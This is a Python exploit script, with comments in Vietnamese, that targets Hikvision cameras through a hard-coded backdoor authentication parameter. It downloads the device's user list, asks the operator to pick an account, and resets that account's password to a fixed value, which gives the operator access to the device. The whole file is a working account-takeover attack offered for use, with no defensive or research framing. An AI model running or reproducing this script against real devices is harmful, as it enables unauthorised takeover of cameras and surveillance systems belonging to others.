#!/usr/bin/env python
# Usage: python exploit.py [IP Address] [Port] [SSL (Y/N)]

import requests
import re
import sys

# Thong tin co ban
newPass = "@Dm1N1$Tr80R"  # Mat khau moi
BackdoorAuthArg = "auth=YWRtaW46MTEK"  # Khoa xac thuc
ip = ""
port = 0
SSL = ""
userID = ""
userName = ""

def Usage():
    print("[i] Usage: python exploit.py [IP Address] [Port] [SSL (Y/N)]")

try:
    ip = sys.argv[1]
    port = int(sys.argv[2])
    SSL = sys.argv[3].upper()

except:
    print("[-] Thieu mot hoac nhieu tham so.")
    Usage()
    sys.exit()

# Kiem tra dinh dang IP
ipmatch = re.search(r"\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b", ip)

if not ipmatch:
    print("[-] Dia chi IP " + ip + " khong dung dinh dang.")
    Usage()
    sys.exit()

# Kiem tra port
if (port == 0) or (port > 65535):
    print("[-] Port " + str(port) + " khong hop le.")
    Usage()
    sys.exit()

# Chon giao thuc
protocol = "https" if SSL == "Y" else "http"

# Tao URL
URLBase = f"{protocol}://{ip}:{port}/"
URLDownload = f"{URLBase}Security/users?{BackdoorAuthArg}"

print("[+] Lay danh sach nguoi dung.")

try:
    DownloadResponse = requests.get(URLDownload).text
except requests.RequestException as e:
    print(f"[-] Loi khi lay danh sach nguoi dung: {e}")
    sys.exit()

# Lay danh sach nguoi dung
for line in DownloadResponse:
    useridmatch = re.search(r"<id>(.*)</id>", line)
    usernamematch = re.search(r"<userName>(.*)</userName>", line)

    if useridmatch:
        userID = useridmatch.group(1)
        print("[+] User ID: " + userID)

    if usernamematch:
        userName = usernamematch.group(1)
        print("[+] Username: " + userName)

# Nhap UserID va Username
userID = input("[?] Chon User ID nao? ")
userName = input("[?] Chon Username nao? ")

print("[+] Dang su dung User " + userName + ".")

# Tao XML
userXML = (f'<User version="1.0" xmlns="http://www.hikvision.com/ver10/XMLSchema">\r\n'
           f'<id>{userID}</id>\r\n'
           f'<userName>{userName}</userName>\r\n'
           f'<password>{newPass}</password>\r\n'
           f'</User>')

# Tao URL upload
URLUpload = f"{URLBase}Security/users/{userID}?{BackdoorAuthArg}"

print("[+] Thay doi mat khau ngay.")

try:
    response = requests.put(URLUpload, data=userXML)
    print(response.text)
except requests.RequestException as e:
    print(f"[-] Loi khi thay doi mat khau: {e}")

print(f"[+] Hoan thanh. Vui long thu dang nhap voi cac thong tin sau. Username: {userName} Password: {newPass}")
